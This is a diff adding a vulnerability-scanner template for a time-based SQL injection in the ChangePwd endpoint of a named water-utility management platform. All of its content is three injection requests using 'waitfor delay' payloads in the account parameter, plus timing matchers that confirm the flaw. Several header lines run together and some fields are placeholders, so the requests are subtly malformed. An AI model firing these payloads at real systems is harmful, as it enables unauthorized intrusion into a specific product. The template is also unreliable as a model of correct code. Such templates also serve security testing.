@@ -1,0 +1,30 @@
+id: weiweisw-ChangePwd-sqli
+info:
+  name: weiweisw-ChangePwd-sqli
+  author: apple
+  severity: high
+  description: 潍微科技-水务信息管理平台 ChangePwd SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:3%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept-Encoding: gzip, deflate, brConnection: close
+      - |-
+        GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept-Encoding: gzip, deflate, brConnection: close
+      - |-
+        GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:9%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept-Encoding: gzip, deflate, brConnection: close
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
